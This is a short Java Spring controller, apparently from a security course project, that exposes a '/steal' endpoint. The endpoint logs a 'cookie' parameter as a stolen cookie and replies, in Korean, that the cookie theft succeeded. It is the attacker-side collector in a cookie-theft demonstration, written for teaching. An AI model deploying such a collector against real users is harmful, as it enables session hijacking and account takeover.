package com.uplus.eureka.security.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class CookieStealController {

	@GetMapping("/steal")
	public String steal(@RequestParam("cookie") String cookie ) {
		System.out.println("CookieStealController....................");	
		System.out.printf("탈취한 쿠키: %s%n", cookie);
		return "쿠키 탈취 성공!!!!";
	}
}
